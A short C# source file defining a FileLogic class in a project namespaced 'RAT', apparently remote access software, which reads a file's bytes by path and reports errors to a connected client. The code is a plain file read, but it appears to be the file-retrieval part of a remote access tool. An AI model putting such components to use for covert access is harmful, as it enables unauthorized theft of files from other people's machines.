using RAT.Interfaces;
using System;
using System.IO;

namespace RAT.Logic.Files
{
    /// <summary>
    /// Class responsible for file handling, read, write, etc.
    /// </summary>
    public class FileLogic : IFileLogic
    {
        private readonly IClientNotificationLogic _notificationLogic;

        /// <summary>
        /// Class responsible for file handling, read, write, etc.
        /// </summary>
        /// <param name="notificationLogic">Logic for sending notifications to client.</param>
        public FileLogic(IClientNotificationLogic notificationLogic)
        {
            _notificationLogic = notificationLogic;
        }

        /// <summary>
        /// Tries to read bytes of file by provided path.
        /// </summary>
        /// <param name="path">Path to file.</param>
        /// <returns>Array filled with file bytes, if error occured then returns empty array.</returns>
        public byte[] GetFileBytesByPath(string path)
        {
            byte[] fileBytes = new byte[0];
            if (!File.Exists(path))
            {
                _notificationLogic.NotifyClient($"\nFile on path \"{path}\" does not exist or is directory\n");
                return fileBytes;
            }

            try
            {
                fileBytes = File.ReadAllBytes(path); // Be aware that this can cause trouble with big files.
            }
            catch (Exception exception)
            {
                _notificationLogic.NotifyClient($"\nError during file read:\n{exception.Message}\n");
            }

            return fileBytes;
        }
    }
}